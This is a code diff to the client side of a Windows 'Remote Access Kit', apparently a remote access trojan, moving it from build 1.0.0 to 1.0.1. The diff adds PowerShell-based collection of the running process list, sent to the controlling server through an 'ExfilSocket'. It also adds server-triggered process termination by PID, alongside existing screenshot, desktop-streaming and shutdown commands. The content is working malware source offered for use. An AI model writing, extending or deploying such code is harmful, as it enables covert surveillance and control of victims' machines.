@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 
 import socket
@@ -56,6 +56,12 @@ class Utilitys:
         version_output = version_output.replace('\n','') #Replace new line with empty string
         return version_output.strip('\r')                #Strip carriage return and return the output
 
+    #Function will return the output of all running process's on the machine
+    def get_running_process(self):
+        command = subprocess.Popen(['powershell', 'get-process'],stdout=subprocess.PIPE,shell=True) #Run the command
+        com_output = command.stdout.read().decode()         #Capture, read and decode output
+        return com_output                                   #Return output
+
     #Function will get computers local ip and return it as string
     def get_local_ip(self):
         local_ip = socket.gethostbyname(socket.gethostname()) #Resolve system name
@@ -98,6 +104,18 @@ class SystemManager:
     def shutdown_computer(self):
         subprocess.run('shutdown /p')
 
+    #Function will send back a list of running process's to the server
+    def extract_process_list(self):
+        process_list = Utilitys().get_running_process() #Get process's
+        ExfilSocket().exfil_socket_send(process_list)   #Send to server
+
+    #Function will kill a task by the pid passed as parameter and send the output to the server
+    def kill_task(self,pid):
+        command = subprocess.Popen(['taskkill','/pid',str(pid),'/f'],stdout=subprocess.PIPE,shell=True) #attempt to kill process by pid
+        output = command.stdout.read().decode()                                                    #Parse the output
+        ExfilSocket().exfil_socket_send(output)                                                    #Send the output to the server
+
+
 class Encryption:
 
     #Function will take string value and encrypt it with the master key and return the encoded value
@@ -131,6 +149,8 @@ class ClientSocket:
         self.screenshot = 'screenshot'
         self.stream_desktop = 'stream_desktop'
         self.disconnect = 'disconnect'
+        self.process_manager = 'proc_list'
+        self.term_process = 'terminate'
 
     #Function will connect to server to initiate handshake
     def connect_to_server(self):
@@ -221,8 +241,12 @@ class ClientSocket:
             if action_flag == self.screenshot:                                        #If the action is screenshot
                 StreamSocket().stream_desktop(screenshot=True)                        #Send a screenshot
             if action_flag == self.disconnect:                                        #If the action is to disconnect
-                exit()
-                #Exit program
+                exit()                                                                #Exit program
+            if action_flag == self.process_manager:                                   #If the action is to get the process's running on the machine
+                SystemManager().extract_process_list()                                #Send process's to server
+            if action_flag == self.term_process:                                      #if the action is to kill a process
+                SystemManager().kill_task(server_command[1])                          #kill the task by pid received from server
+
     #Function will retrieve all data sent by server socket
     def recv_all_data(self):
         bytes_data = b''                                    #Create empty byte string
